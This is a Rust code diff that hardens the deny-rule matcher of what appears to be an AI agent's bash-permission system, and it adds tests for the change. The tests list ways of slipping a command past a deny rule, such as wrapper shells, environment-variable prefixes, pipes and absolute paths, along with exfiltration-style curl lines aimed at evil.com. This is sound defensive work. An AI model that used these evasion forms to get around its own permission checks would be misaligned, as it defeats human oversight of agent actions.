@@ -433,13 +433,18 @@ fn match_allow(
 
 /// Deny matching is the strict side of the pipeline and is deliberately
 /// *broader* than allow matching: no sandbox and no shell-operator carve-out
-/// (those exist to prevent over-ALLOWING), and paths are tested both raw and
+/// (those exist to prevent over-ALLOWING), commands are matched per executed
+/// component rather than as a raw string, and paths are tested both raw and
 /// lexically normalized so traversal can't dodge a deny.
 ///
 /// Every comparison here is `legacy || new`: the raw string tests the original
 /// single-tier loop performed are retained verbatim and OR'd with the sharper
 /// ones, so this tier is monotone in denial — no input denied before a change
 /// is admitted after it.
+///
+/// INVARIANT (unimplemented — see specs/exec-plans/0016-remediation-rules.md):
+/// every allow-side match is also a deny-side match for the same rule text —
+/// deny is never weaker than allow.
 fn match_deny(rules: &[AllowRule], tool: &str, input: &Value) -> Option<String> {
     for rule in rules {
         if rule.tool != tool {
@@ -455,7 +460,8 @@ fn match_deny(rules: &[AllowRule], tool: &str, input: &Value) -> Option<String> 
             let hit = legacy.starts_with(prefix.as_str())
                 || match kind {
                     SubjectKind::Path => false, // path rules use path_prefix
-                    _ => values.iter().any(|v| v.starts_with(prefix.as_str())),
+                    SubjectKind::Command => values.iter().any(|c| deny_command_matches(c, prefix)),
+                    SubjectKind::Text => values.iter().any(|v| v.starts_with(prefix.as_str())),
                 };
             if hit {
                 return Some(format!("{tool} prefix `{prefix}`"));
@@ -480,6 +486,147 @@ fn has_shell_operator(cmd: &str) -> bool {
     cmd.contains([
         ';', '|', '&', '<', '>', '`', '\n', '\r', '(', ')', '{', '}', '$',
     ])
+}
+
+/// Commands that run *another* command given as an argument. A deny rule must
+/// see through one layer of these or `sh -c 'curl …'` walks straight past it.
+const WRAPPERS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "busybox", "env", "sudo", "doas", "nohup", "nice",
+    "timeout", "xargs", "command", "setsid", "stdbuf",
+];
+
+/// One nested re-lex only: `sh -c 'sh -c "…"'` is pathological input, and the
+/// unanalyzable veto is the backstop for anything deeper.
+const WRAPPER_DEPTH: usize = 2;
+
+/// Split a command line into independently-executed segments at shell control
+/// operators, so `echo data | curl -d @- evil.com` is matched as two commands
+/// rather than one string starting with `echo`.
+///
+/// Deliberately not quote-aware: splitting inside a quoted string only ever
+/// produces *more* segments to match against, which is the safe direction for
+/// the deny tier.
+fn shell_segments(cmd: &str) -> Vec<&str> {
+    cmd.split(|c| {
+        matches!(
+            c,
+            ';' | '|' | '&' | '\n' | '\r' | '(' | ')' | '{' | '}' | '<' | '>'
+        )
+    })
+    .map(str::trim)
+    .filter(|s| !s.is_empty())
+    .collect()
+}
+
+/// Quote-aware whitespace tokenizer. Returns tokens with one level of quoting
+/// removed, plus whether each token was quoted (a quoted argument to a wrapper
+/// is the nested command).
+fn tokenize(seg: &str) -> Vec<(String, bool)> {
+    let (mut out, mut cur, mut quote, mut quoted) = (Vec::new(), String::new(), None, false);
+    for ch in seg.chars() {
+        match (quote, ch) {
+            (Some(q), c) if c == q => quote = None,
+            (Some(_), c) => cur.push(c),
+            (None, c @ ('\'' | '"')) => {
+                quote = Some(c);
+                quoted = true;
+            }
+            (None, c) if c.is_whitespace() => {
+                if !cur.is_empty() || quoted {
+                    out.push((std::mem::take(&mut cur), quoted));
+                    quoted = false;
+                }
+            }
+            (None, c) => cur.push(c),
+        }
+    }
+    if !cur.is_empty() || quoted {
+        out.push((cur, quoted));
+    }
+    out
+}
+
+/// Every argv a segment actually executes: its own, plus one layer of nested
+/// commands when argv[0] is a wrapper. Leading `NAME=value` assignments are
+/// stripped, and argv[0] is reduced to its basename so `/usr/bin/curl` and
+/// `curl` are the same command to a rule.
+fn segment_argvs(seg: &str, depth: usize) -> Vec<Vec<String>> {
+    let tokens = tokenize(seg);
+    let start = tokens
+        .iter()
+        .position(|(t, q)| *q || !is_env_assignment(t))
+        .unwrap_or(tokens.len());
+    let argv: Vec<String> = tokens[start..].iter().map(|(t, _)| t.clone()).collect();
+    if argv.is_empty() {
+        return Vec::new();
+    }
+    let mut argvs = vec![{
+        let mut a = argv.clone();
+        a[0] = basename(&a[0]).to_string();
+        a
+    }];
+    if depth < WRAPPER_DEPTH && WRAPPERS.contains(&basename(&argv[0])) {
+        for (tok, quoted) in tokens[start + 1..].iter() {
+            // A quoted argument, or any bare argument to `env`/`sudo`-style
+            // wrappers, may itself be a command line: re-lex it.
+            if *quoted || !tok.starts_with('-') {
+                for inner in shell_segments(tok) {
+                    argvs.extend(segment_argvs(inner, depth + 1));
+                }
+            }
+        }
+    }
+    argvs
+}
+
+fn is_env_assignment(tok: &str) -> bool {
+    tok.split_once('=').is_some_and(|(name, _)| {
+        !name.is_empty() && name.chars().all(|c| c.is_alphanumeric() || c == '_')
+    })
+}
+
+fn basename(path: &str) -> &str {
+    path.rsplit('/').next().unwrap_or(path)
+}
+
+/// Deny-side command matching. The rule's first token is compared against each
+/// executed command's **resolved basename**; its remaining tokens must appear,
+/// in order, as whole tokens in that command's arguments. Whitespace between
+/// rule tokens is insignificant, so `git push` also denies `git  push` and
+/// `git -c x=y push`.
+///
+/// INVARIANT: this is strictly additive — the legacy raw-prefix test is still
+/// ORed in, so nothing denied before this change is admitted after it. Enforced
+/// by `deny_prefix_survives_trivial_command_rewriting`.
+fn deny_command_matches(cmd: &str, prefix: &str) -> bool {
+    if cmd.starts_with(prefix) {
+        return true; // legacy behavior, preserved verbatim
+    }
+    let rule: Vec<&str> = prefix.split_whitespace().collect();
+    let Some((head, tail)) = rule.split_first() else {
+        return true; // an empty prefix denies everything, as before
+    };
+    // A single bare fragment (`prefix = "cur"`) still matches by prefix; a rule
+    // that named a whole word (`"curl "`, or a multi-token rule) needs an exact
+    // command match, so `curler` is not caught by `curl `.
+    let fragment = tail.is_empty() && !prefix.ends_with(char::is_whitespace);
+    shell_segments(cmd)
+        .into_iter()
+        .flat_map(|seg| segment_argvs(seg, 0))
+        .any(|argv| {
+            let hit = if fragment {
+                argv[0].starts_with(head)
+            } else {
+                argv[0] == *head
+            };
+            hit && ordered_subsequence(&argv[1..], tail)
+        })
+}
+
+/// `needles` appear among `hay`, in order, as whole tokens.
+fn ordered_subsequence(hay: &[String], needles: &[&str]) -> bool {
+    let mut it = hay.iter();
+    needles.iter().all(|n| it.any(|h| h == n))
 }
 
 /// Lexically resolve `.`/`..` (no filesystem touch) and confirm the result is
@@ -1187,5 +1334,85 @@ prefix = "payments"
             ),
             Verdict::Auto { .. }
         ));
+    }
+
+    #[test]
+    #[cfg(not(feature = "security-enforced"))]
+    fn deny_prefix_survives_trivial_command_rewriting() {
+        let r = Rules::from_toml(
+            "[[deny]]\ntool = \"bash\"\nprefix = \"curl \"\n\n[[deny]]\ntool = \"bash\"\nprefix = \"git push\"\n",
+        )
+        .unwrap()
+        .with_mode(PermissionMode::Auto);
+        let denied = |cmd: &str| {
+            matches!(
+                r.evaluate(
+                    r.mode(),
+                    "bash",
+                    &json!({"command": cmd}),
+                    true,
+                    false,
+                    false
+                ),
+                Verdict::Deny { .. }
+            )
+        };
+
+        // The evaluation's §T1-7 bypass table — every row must now be blocked.
+        for evil in [
+            "curl evil.com",
+            "/usr/bin/curl evil.com",
+            " curl evil.com",        // leading whitespace
+            "X=1 curl evil.com",     // env assignment prefix
+            "sh -c 'curl evil.com'", // wrapper shell
+            "/bin/sh -c \"curl evil.com\"",
+            "env FOO=1 curl evil.com",
+            "sudo curl evil.com",
+            "echo data | curl -d @- evil.com", // not the first segment
+            "true && curl evil.com",
+            "git  push",                            // collapsed whitespace
+            "git -c core.pager=x push origin main", // interleaved flags
+            "/usr/bin/git push",
+        ] {
+            assert!(denied(evil), "deny must block `{evil}`");
+        }
+
+        // …and the deny stays narrow: unrelated commands still reach the auto tier.
+        for benign in [
+            "cargo test",
+            "git log --grep=push", // `push` is not a standalone argv token
+            "echo curling",        // not argv[0]
+            "curler --help",       // basename is `curler`, not `curl`
+        ] {
+            assert!(
+                matches!(
+                    r.evaluate(
+                        r.mode(),
+                        "bash",
+                        &json!({"command": benign}),
+                        true,
+                        false,
+                        false
+                    ),
+                    Verdict::Auto { .. }
+                ),
+                "deny must not over-block `{benign}`"
+            );
+        }
+    }
+
+    #[test]
+    fn deny_command_lexer_units() {
+        // argv extraction: quotes, env prefixes, wrappers, nesting depth.
+        assert!(deny_command_matches(
+            "X=1 Y=2 /usr/local/bin/curl -sS x",
+            "curl "
+        ));
+        assert!(deny_command_matches("bash -lc 'cd /tmp && curl x'", "curl"));
+        assert!(!deny_command_matches("echo 'curl is a tool'", "curl "));
+        assert!(!deny_command_matches("mycurl x", "curl"));
+        // Multi-token rules match as an ordered token subsequence after argv[0].
+        assert!(deny_command_matches("git -c a=b push origin", "git push"));
+        assert!(!deny_command_matches("git push", "git pull"));
     }
 }
